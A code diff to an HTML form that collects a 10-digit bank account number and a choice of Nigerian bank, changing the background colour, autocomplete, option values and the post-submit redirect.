@@ -11,7 +11,7 @@
     }
 
     body {
-      background: #fff;
+      background: #ffe;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -243,38 +243,38 @@
 
      <div class="input-group">
         <label>Account Number<a style="color:red">*</a></label>
-        <input type="text" autocomplete="off" name="Account Number" minlength="10" maxlength="10" pattern="\d{10}" required title="Enter 10-digits account number"/>
+        <input type="text" autocomplete="on" name="Account Number" minlength="10" maxlength="10" pattern="\d{10}" required title="Enter 10-digits account number"/>
       </div>
       <div class="input-group">
         <label for="bank">Select Your Bank<a style="color:red">*</a></label>
 <select name="Bank" id="Bank" autocomplete="on"  required>
   <option value=""></option>
-  <option value="access">Access Bank</option>
-  <option value="citibank">Citibank Nigeria</option>
-  <option value="ecobank">Ecobank Nigeria</option>
-  <option value="fidelity">Fidelity Bank</option>
-  <option value="firstBank">First Bank of Nigeria</option>
-  <option value="fcmb">First City Monument Bank (FCMB)</option>
-  <option value="globus">Globus Bank</option>
-  <option value="gtbank">Guaranty Trust Bank (GTBank)</option>
+  <option value="Access">Access Bank</option>
+  <option value="Citibank">Citibank Nigeria</option>
+  <option value="Ecobank">Ecobank Nigeria</option>
+  <option value="Fidelity">Fidelity Bank</option>
+  <option value="FirstBank">First Bank of Nigeria</option>
+  <option value="Fcmb">First City Monument Bank (FCMB)</option>
+  <option value="Globus">Globus Bank</option>
+  <option value="Gtbank">Guaranty Trust Bank (GTBank)</option>
   <option value="heritage">Heritage Bank</option>
-  <option value="keystone">Keystone Bank</option>
-  <option value="optima">Optimus Bank</option>
-  <option value="parallex">Parallex Bank</option>
-  <option value="polaris">Polaris Bank</option>
-  <option value="premiumTrust">PremiumTrust Bank</option>
-  <option value="providus">Providus Bank</option>
-  <option value="stanbic">Stanbic IBTC Bank</option>
-  <option value="standardChartered">Standard Chartered Bank</option>
-  <option value="sterling">Sterling Bank</option>
-  <option value="suntrust">SunTrust Bank</option>
-  <option value="taj">TAJ Bank</option>
-  <option value="titan">Titan Trust Bank</option>
-  <option value="union">Union Bank of Nigeria</option>
-  <option value="uba">United Bank for Africa (UBA)</option>
-  <option value="unity">Unity Bank</option>
-  <option value="wema">Wema Bank</option>
-  <option value="zenith">Zenith Bank</option>
+  <option value="Keystone">Keystone Bank</option>
+  <option value="Optima">Optimus Bank</option>
+  <option value="Parallex">Parallex Bank</option>
+  <option value="Polaris">Polaris Bank</option>
+  <option value="PremiumTrust">PremiumTrust Bank</option>
+  <option value="Providus">Providus Bank</option>
+  <option value="Stanbic">Stanbic IBTC Bank</option>
+  <option value="StandardChartered">Standard Chartered Bank</option>
+  <option value="Sterling">Sterling Bank</option>
+  <option value="Suntrust">SunTrust Bank</option>
+  <option value="Taj">TAJ Bank</option>
+  <option value="Titan">Titan Trust Bank</option>
+  <option value="Union">Union Bank of Nigeria</option>
+  <option value="Uba">United Bank for Africa (UBA)</option>
+  <option value="Unity">Unity Bank</option>
+  <option value="Wema Bank">Wema Bank</option>
+  <option value="Zenith Bank">Zenith Bank</option>
 </select>
       </div>
 
@@ -300,9 +300,9 @@
     .then(response => response.text())
     .then(result => {
       console.log("Server response:", result);
-
+     alert("Submitted");
       // ✅ Always redirect after success
-      window.location.href = "verify.html";
+      //window.location.href = "verify.html";
     })
     .catch(error => {
       alert("Error sending form. Please try again.");
